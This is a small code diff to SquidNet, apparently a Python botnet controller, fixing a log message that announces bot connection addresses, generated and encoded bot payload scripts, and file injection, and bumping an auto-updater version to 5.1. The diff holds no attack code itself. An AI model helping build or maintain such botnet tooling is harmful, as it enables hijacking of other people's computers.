@@ -143,7 +143,7 @@ class SquidNet:
 [({datetime.today()})][(INFO)]: Bots/Admins will connect to: {self.external_ip}:{self.external_port}
 [({datetime.today()})][(INFO)]: Payload Bot Script Generated in '{os.path.join(os.getcwd(), self.payloadfile.name)}'
 [({datetime.today()})][(INFO)]: Encoded Payload Bot Script Generated in '{os.path.join(os.getcwd(), self.encoded_payload.name)}'(do not use this with py2exe, use the normal payload)"""
-+f"\n[({datetime.today()})][(INFO)]: File '{self.injectfile}' has been inserted into the payloads" if working_inject else ""+"""""")
++(f"\n[({datetime.today()})][(INFO)]: File '{self.injectfile}' has been inserted into the payloads" if working_inject else "")+"""""")
         self.botnum = 1
         self.connlist = []
         self.botinfo = []
@@ -5434,7 +5434,7 @@ class AutoUpdate:
     script will be completely wiped, and replaced with the new one.
     """
     def __init__(self):
-        self.version = 5.0
+        self.version = 5.1
     def check_update(self):
         """Sends the request to the github repository, and checks to see if the script needs and update."""
         print(SquidNet.logo.fget())
